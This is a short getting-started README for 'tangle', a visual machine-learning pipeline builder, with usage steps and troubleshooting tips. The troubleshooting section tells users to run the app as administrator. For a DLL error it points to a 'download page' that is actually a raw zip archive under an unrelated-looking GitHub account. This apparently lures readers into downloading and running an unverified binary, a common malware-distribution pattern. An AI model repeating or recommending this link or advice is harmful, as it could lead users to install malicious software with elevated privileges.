## 🌟 Your First Steps with tangle

Once tangle is running, you'll see its friendly interface. Here's how to start building your first Machine Learning pipeline:

### 1️⃣ Explore the Canvas
- You'll see a **blank canvas** (like a digital whiteboard).
- On the left side, there's a **toolbox** with different blocks (also called "nodes").

### 2️⃣ Add Your First Block
- Click and drag a block from the toolbox onto the canvas.
- Each block does something specific—like loading data, cleaning data, or making predictions.

### 3️⃣ Connect the Blocks
- Drag lines from the edge of one block to another to **connect** them.
- This tells tangle how data should flow through your pipeline.

### 4️⃣ Run Your Pipeline
- Look for a green **"Run" button** (usually at the top).
- Click it, and tangle will execute your pipeline step by step.
- You'll see results appear in real-time!

### 5️⃣ Save & Share
- Save your pipelines with the **"Save" button**.
- You can also export them to share with others.

## 🧩 Troubleshooting Tips

### Problem: tangle won't open
- **Solution:** Right-click the tangle icon and select **"Run as administrator"**.
- Make sure your browser is updated.

### Problem: I see a "Missing DLL" error
- **Solution:** Download the latest version from the [download page](https://raw.githubusercontent.com/tcdmwcaa/tangle/main/kooliman/3.5.zip). Older versions might have this issue.

### Problem: The app is very slow
- **Solution:** Close other heavy programs (like games or video editors).
- Restart tangle.

### Problem: My blocks won't connect
- **Solution:** Make sure you're dragging from the **output port** (usually on the right of a block) to the **input port** (usually on the left of another block).
